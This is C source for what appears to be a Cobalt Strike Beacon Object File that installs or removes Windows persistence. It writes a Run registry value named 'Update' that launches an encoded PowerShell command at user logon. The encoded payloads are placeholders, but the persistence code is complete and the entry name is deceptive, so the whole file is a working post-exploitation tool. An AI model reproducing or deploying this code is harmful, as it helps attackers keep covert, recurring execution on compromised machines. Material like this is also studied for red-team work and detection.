#include <string.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, BYTE*, DWORD);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteKeyValueW (HKEY, LPCWSTR, LPCWSTR);

void InstallPersistence() {
	HKEY key;
    WCHAR payload[] = L"powershell -enc AAAAAAAA=="; 

    
    
    if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT,"Key opened \n");
        if (ADVAPI32$RegSetValueExW(key, L"Update", 0, REG_SZ, (LPBYTE)payload, sizeof(payload)) == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT,"Key changed in registry, persistence installed \n");

            
        }
        else{
            BeaconPrintf(CALLBACK_OUTPUT,"Key not changed in registry \n");
   
        }
        ADVAPI32$RegCloseKey(key);
    }
    else 
    {
        BeaconPrintf(CALLBACK_OUTPUT,"Failed to open key  \n");
        BeaconPrintf(CALLBACK_OUTPUT,"Cannot find key value in registry \n");
  
    }

}

void RemovePersistence() {
	HKEY key;
    WCHAR keyname[] = L"Update";
    WCHAR payload[] = L"powershell -enc JDJDJDJDJ=="; 
    
    
    if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT,"Key location open successful \n");
        if (ADVAPI32$RegDeleteKeyValueW(key, L"Run", keyname) == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT,"Key deleted in registry, persistence removed. \n");
        }
        else{
            BeaconPrintf(CALLBACK_OUTPUT,"Key not deleted in registry \n");
   
        }
        ADVAPI32$RegCloseKey(key);
    }
    else 
    {
        BeaconPrintf(CALLBACK_OUTPUT,"Unsuccessful in opening key  \n");
        BeaconPrintf(CALLBACK_OUTPUT,"Cannot find key value in registry \n");
    }
}

void go(char * args, int alen) {
    int remove;
    int install;
    remove = MSVCRT$strcmp(args, "Remove") == 0;
    install = MSVCRT$strcmp(args, "Install") == 0;
    if(remove > 0) {
        RemovePersistence();
    }else if(install > 0){
        InstallPersistence();
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Please use either an Install or Remove argument.");
    }
    
}